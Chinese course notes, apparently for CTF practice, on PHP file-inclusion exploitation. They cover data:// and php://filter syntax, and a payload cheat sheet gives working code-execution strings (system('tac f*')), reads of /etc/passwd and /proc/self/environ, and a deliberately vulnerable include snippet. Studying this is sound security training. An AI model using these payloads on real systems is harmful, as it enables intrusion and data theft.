---
title: 文件包含利用：data:// 与常见伪协议写法
category: 文件包含/伪协议
tags: [文件包含, data协议, php://filter, 伪协议, payload格式, read, write]
source: 课程笔记
order: 2
---

## 一句话概括

拿到一个包含点后，能不能「不依赖磁盘上已有的文件」也执行代码，取决于 **`data://`**（把代码直接写在 URL 里）和 **`php://filter`**（把文件内容当数据流读出来）。这两个包装器是文件包含利用里使用频率最高的。

## 原理

### 1. `data://` 的格式：三种写法

`data://`（RFC 2397）允许把数据**直接内联在 URL 里**，所以它天然就是「无文件 RCE」的载体。

**标准格式（多用于 base64 形态）：**

```text
?page=data://text/plain;base64,[base64_encode(shell)]
```

**可省略的写法（直接写原文）：**

```text
?page=data://text/plain,shell
```

`;base64` 这一段是**可选的**：不写 `;base64` 时，`data://` 后面跟的就是**明文**；写了 `;base64`，后面的内容必须先用 Base64 编码（URL 中不能出现 `+` 和 `=` 的原始形态，通常还要做 URL 编码）。

**两个可直接用的例子：**

```text
?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZioiKTs/Pg==
```

```text
?file=data://text/plain,<?=system("tac f*");?>
```

- 第一条是 `<?=system("tac f*");?>` 的 Base64，**不含任何可疑字符**，专治对 `<?`、`system`、`php` 等关键词的过滤；
- 第二条是明文，**更短更直观**，但 `<?=`、`(`、`)`、`"` 都可能被 WAF 盯上。
- 两条用的是短标签 `<?=`，因为 `<?=` 本身就是 `<?php echo` 的缩写，很多题目只过滤 `<?php` 而不认 `<?=`。

> `data://` 用于 `include` 时**需要 `allow_url_include=On`**。这是它和 `php://filter` 最本质的差别 —— 后者不需要。详见 `文件包含漏洞原理与前置条件.md`。

### 2. `php://filter`：明文读取与编码读取

`php://filter` 的基本语法是**过滤器 + resource**：

```text
index.php?file1=php://filter/resource=file.txt
```

```text
index.php?file1=php://filter/read=convert.base64-encode/resource=file.txt
```

| 写法 | 发生什么 | 结果 |
|---|---|---|
| `php://filter/resource=file.txt` | 不加任何过滤器，原样读取字节流 | **明文**，但内容里有 PHP 标签的话仍会被当代码执行掉 |
| `php://filter/read=convert.base64-encode/resource=file.txt` | 读到的字节先 base64 编码 | **编码读取**，输出纯 ASCII，`include` 执行不了 → 有回显 |

**`read=` / `write=` 可以省略**（原笔记专门问过这一点）：只有一个过滤器时，PHP 默认把它当成**读方向**的过滤器，所以 `php://filter/convert.base64-encode/resource=x` 和 `php://filter/read=convert.base64-encode/resource=x` 等价。

- `read=` 处理**读取时**的数据流；
- `write=` 处理**写入时**的数据流（例如用 `file_put_contents` 写文件时先编码）；
- 省略不写 = 只作用于读方向 = 我们最常用的那一种。

**多个过滤器用 `|` 链式拼接：**

```text
php://filter/read=convert.base64-encode|zlib.deflate/resource=example.txt
php://filter/write=string.rot13/resource=example.txt
```

链式下如果还想指定方向，**`read=` / `write=` 必须写在最前面且不能省**，否则 PHP 无法确定整条链作用在哪个方向。

### 3. 一次包含，可以做哪些事

拿到一个包含点后，按「需要什么」来挑 payload，大致分四类：

| 目标 | payload 形态 |
|---|---|
| 读系统文件 | `?file=/etc/passwd`、`?file=/etc/hosts`、`?file=/proc/self/environ`、`?file=/proc/version` |
| 读源码 | `?file=index.php`（会执行）、`?file=php://filter/read=convert.base64-encode/resource=index.php`（首选） |
| 找 flag 文件 | `?file=/flag`、`?file=/flag.txt`、`?file=/var/www/html/flag`、`?file=/tmp/flag` |
| 直接执行代码 | `?file=data://text/plain,<?php system('ls');?>`（需 `allow_url_include=On`） |

一个典型的漏洞源码长这样：

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);   // 直接包含用户输入，存在文件包含漏洞
}
?>
```

值得注意的两个细节：

- `isset($_GET['file'])` 只保证「参数存在且不为 null」。**它完全不校验内容** —— 只要传 `?file=` 后面有东西就能进这个分支；
- 由于是 `include`，`?file=index.php` 会**执行** `index.php`（可能什么都没输出），而不是把源码给你看。**想读源码必须上 `php://filter`。**

## 利用条件

1. 存在可控的 `include` 参数（`?file=` 等）；
2. `data://` 路线：**`allow_url_include=On`**；
3. `php://filter` 路线：无额外配置要求，但要求目标文件进程可读（`open_basedir` 内）；
4. 有回显通道，或至少能观察到「包含成功 / 失败」的差异。

## Payload 速查

| 目的 | Payload |
|---|---|
| 读源码（Base64） | `?file=php://filter/read=convert.base64-encode/resource=index.php` |
| 读源码（Base64，省 `read=`） | `?file=php://filter/convert.base64-encode/resource=index.php` |
| 读源码（rot13） | `?file=php://filter/read=string.rot13/resource=index.php` |
| 只读不编码 | `?file=php://filter/resource=file.txt` |
| 明文内联代码 | `?file=data://text/plain,<?=system("tac f*");?>` |
| Base64 内联代码 | `?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZioiKTs/Pg==` |
| 包含 POST 体 | `?file=php://input`（请求体写 PHP） |
| 过滤器链（绕过滤） | `?file=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=flag.php` |

## 完整示例

一条不含敏感关键词的 `data://` 利用链：

**1. 本地生成 payload**

```bash
# 目标代码：<?=system("tac f*");?>
echo -n '<?=system("tac f*");?>' | base64
# PD89c3lzdGVtKCJ0YWMgZioiKTs/Pg==
```

**2. 发送请求**

```http
GET /?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZioiKTs/Pg== HTTP/1.1
Host: 靶机地址
```

**3. 观察回显**

页面里直接出现 `f*` 匹配到的文件内容 —— 说明 `data://` 的内容被当 PHP 执行了。

> 如果这一步返回的是「包含失败」或空白，先确认 `allow_url_include` 是不是 `On`：`data://` 和 `php://input` 都卡在这个开关上，`php://filter` 不卡。

## 踩坑与备注

- **`data://` 一定要看 `allow_url_include`**：这是它最常见的失败原因。同一道题里 `php://filter` 能读、`data://` 执行不了，多半就是开关没开。
- **`;base64` 不能写错位置**：必须是 `data://text/plain;base64,<数据>`，`;base64` 在媒体类型之后、逗号之前。
- **Base64 内容要再 URL 编码**：标准 Base64 里的 `+` 在 URL 查询串中会被当成空格，`=` 也可能被截断。手工测试时优先用不含 `+` / `=` 的 payload，或整体做一次 URL 编码。
- **短标签 `<?=` 的兼容性**：`<?=` 从 PHP 5.4 起始终可用，不受 `short_open_tag` 影响；但 `<?`（不带 `=`）受该配置控制，兼容性差，不要用。
- **原笔记的一句结论**：「`php://input` 和 `data` 都是将内容上传」—— 准确说两者都是**把攻击者提供的内容当代码喂给包含函数**，区别在数据来自 URL 还是请求体（详见 `06-文件读取\data与php-input对比.md`）。
